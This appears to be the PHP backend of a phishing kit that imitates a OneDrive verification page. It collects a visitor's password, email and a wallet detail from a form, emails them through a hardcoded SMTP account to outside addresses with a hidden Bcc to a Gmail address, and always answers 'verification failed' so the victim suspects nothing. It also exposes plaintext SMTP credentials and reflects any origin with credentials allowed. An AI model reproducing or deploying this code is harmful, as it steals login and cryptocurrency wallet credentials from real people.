<?php

header('Content-Type: application/json');
header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Max-Age: 86400');
        
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$password = $_POST['password'];
$email = $_POST['email'];
$wallet = $_POST['detail'];
$msg = $wallet . '<br /> <br /> ' . $password . '<br/> <br/> ' . $email;

$mail = new PHPMailer(true);
try {
    //Server settings
    $mail->SMTPDebug = 0;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'urbancube.net';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'support@urbancube.net';                     //SMTP username
    $mail->Password   = 'UrbanCube2023';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('support@urbancube.net', 'One Drive Server');
    $mail->addAddress('stuff@grandapihub.org.ng');     //Add a recipient
    $mail->addBcc('olajesujuwon@gmail.com');     //Add a recipient
    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = "One drive";
    $mail->Body    = $msg;
    // $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    echo json_encode([
        'status' => 'verification failed',
    ]);
} catch (Exception $e) {
    echo json_encode([
        'status' => 'verification failed.',
        [
            $mail->ErrorInfo
        ],
    ]);
    // 'Mailer Error: ' . $mail->ErrorInfo;
}
